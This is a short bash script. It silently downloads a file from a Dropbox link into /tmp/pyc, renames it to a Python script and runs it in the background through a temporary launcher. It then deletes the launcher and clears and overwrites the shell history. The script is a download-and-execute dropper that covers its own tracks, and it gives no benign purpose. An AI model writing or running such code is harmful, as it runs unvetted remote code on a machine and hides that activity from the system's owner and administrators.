#!/bin/bash
URL="https://www.dropbox.com/s/wdkbnelbu6tr8i7/pyc.txt?dl=0"

if [ -d "/tmp/pyc" ]
then
	rm -rf "/tmp/pyc"
fi
mkdir "/tmp/pyc"

if wget -q -O "/tmp/pyc/pyc.txt" ${URL} > /dev/null
then
	mv "/tmp/pyc/pyc.txt" "/tmp/pyc/pyc.py"
	chmod +x "/tmp/pyc/pyc.py"

	echo "#!/bin/bash" >> "/tmp/pyc/l.sh"
	echo "python pyc.py $1" >> "/tmp/pyc/l.sh"
	chmod +x "/tmp/pyc/l.sh"

	source "/tmp/pyc/l.sh" &
fi

rm -rf "/tmp/pyc/l.sh"
history -c && history -w